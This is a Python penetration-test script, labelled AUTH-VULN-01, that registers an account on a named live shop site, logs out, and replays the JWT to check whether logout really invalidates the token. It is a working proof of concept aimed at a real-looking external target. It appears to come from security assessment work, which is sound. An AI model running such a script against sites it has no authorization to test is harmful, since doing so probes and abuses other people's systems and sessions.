#!/usr/bin/env python3
"""
Security test script for AUTH-VULN-01: JWT Token Replay After Logout
Tests whether a JWT bearer token remains valid after the user has logged out,
proving that server-side token invalidation is absent or broken.

Target: https://shophubonline.store
"""

import requests
import json
import time

BASE_URL = "https://shophubonline.store"
RESULTS = []

def log(msg):
    print(msg)
    RESULTS.append(msg)

def req(method, url, **kwargs):
    try:
        r = requests.request(method, url, timeout=15, **kwargs)
        return r
    except Exception as e:
        log(f"  [ERROR] {e}")
        return None

def print_response(r, label=""):
    if r is None:
        log(f"  {label} -> NO RESPONSE")
        return
    log(f"  {label} -> HTTP {r.status_code}")
    log(f"  Response Headers: {dict(r.headers)}")
    body = r.text[:1000] if r.text else "(empty)"
    log(f"  Response Body: {body}")

# ─────────────────────────────────────────────
# Step 1: Register a new account
# ─────────────────────────────────────────────
timestamp = int(time.time())
email = f"pentest_auth01_{timestamp}@mailnull.com"
password = "TestAttack1"

log("=" * 70)
log("STEP 1: Registering a new account")
log("=" * 70)
log(f"  Email: {email}")
log(f"  Password: {password}")

register_payload = {
    "name": "Test Attacker",
    "email": email,
    "password": password
}

r_register = req(
    "POST",
    f"{BASE_URL}/api/auth/register",
    headers={"Content-Type": "application/json"},
    json=register_payload
)
print_response(r_register, "POST /api/auth/register")

jwt_token = None
set_cookie_header = None

if r_register is not None and r_register.status_code in (200, 201):
    # Extract JWT from JSON response body
    try:
        data = r_register.json()
        jwt_token = data.get("token")
        log(f"  Extracted JWT token: {jwt_token}")
    except Exception as e:
        log(f"  Could not parse registration JSON: {e}")

    # Extract Set-Cookie header
    set_cookie_header = r_register.headers.get("Set-Cookie")
    if set_cookie_header:
        log(f"  Extracted Set-Cookie: {set_cookie_header}")
    else:
        log("  No Set-Cookie header found in registration response.")
        # Fallback: check cookies jar
        if r_register.cookies:
            cookie_dict = dict(r_register.cookies)
            log(f"  Cookies from jar: {cookie_dict}")
else:
    log("  Registration failed — cannot proceed.")
    raise SystemExit(1)

if not jwt_token:
    log("  No JWT token found in registration response — cannot proceed.")
    raise SystemExit(1)

log("")

# ─────────────────────────────────────────────
# Step 2: Confirm profile works BEFORE logout
# ─────────────────────────────────────────────
log("=" * 70)
log("STEP 2: Confirming profile is accessible BEFORE logout (baseline)")
log("=" * 70)

r_pre = req(
    "GET",
    f"{BASE_URL}/api/auth/profile",
    headers={"Authorization": f"Bearer {jwt_token}"}
)
print_response(r_pre, "GET /api/auth/profile (Bearer only, before logout)")
log("")

# ─────────────────────────────────────────────
# Step 3: Logout using the session cookie
# ─────────────────────────────────────────────
log("=" * 70)
log("STEP 3: Logging out with session cookie")
log("=" * 70)

logout_headers = {"Content-Type": "application/json"}
if set_cookie_header:
    # Parse the cookie name=value from Set-Cookie header
    cookie_kv = set_cookie_header.split(";")[0].strip()
    logout_headers["Cookie"] = cookie_kv
    log(f"  Sending Cookie header: {cookie_kv}")
else:
    # Use the cookies jar directly via requests session
    log("  No Set-Cookie header; attempting logout using cookies jar.")

r_logout = req(
    "POST",
    f"{BASE_URL}/api/auth/logout",
    headers=logout_headers,
    cookies=r_register.cookies if not set_cookie_header else None
)
print_response(r_logout, "POST /api/auth/logout")

if r_logout is not None:
    log(f"  Logout HTTP status: {r_logout.status_code}")
else:
    log("  Logout request failed — no response.")

log("")

# ─────────────────────────────────────────────
# Step 4: Replay JWT token AFTER logout (no cookie)
# ─────────────────────────────────────────────
log("=" * 70)
log("STEP 4: Replaying JWT token AFTER logout (no session cookie)")
log("=" * 70)
log(f"  Using Authorization: Bearer {jwt_token}")
log("  No Cookie header sent.")

r_replay = req(
    "GET",
    f"{BASE_URL}/api/auth/profile",
    headers={"Authorization": f"Bearer {jwt_token}"}
    # Deliberately NO cookies= parameter
)
print_response(r_replay, "GET /api/auth/profile (Bearer only, after logout)")
log("")

# ─────────────────────────────────────────────
# Step 5: Verdict
# ─────────────────────────────────────────────
log("=" * 70)
log("STEP 5: VULNERABILITY VERDICT")
log("=" * 70)

if r_replay is None:
    log("  RESULT: INCONCLUSIVE — profile request after logout returned no response.")
elif r_replay.status_code == 200:
    log("  *** VULNERABILITY CONFIRMED: TOKEN REPLAY AFTER LOGOUT ***")
    log("  GET /api/auth/profile returned HTTP 200 with a Bearer token after logout.")
    log("  The server does NOT invalidate JWTs on logout.")
    log("  An attacker who captures a token can continue using it indefinitely.")
    try:
        body_data = r_replay.json()
        log(f"  User data returned: {json.dumps(body_data, indent=2)[:500]}")
    except Exception:
        log(f"  Response body: {r_replay.text[:500]}")
elif r_replay.status_code in (401, 403):
    log(f"  RESULT: NOT VULNERABLE — HTTP {r_replay.status_code} returned after logout.")
    log("  The server correctly invalidates the JWT token on logout.")
else:
    log(f"  RESULT: UNEXPECTED — HTTP {r_replay.status_code} returned after logout.")
    log(f"  Response body: {r_replay.text[:300]}")

log("")
log("Done.")
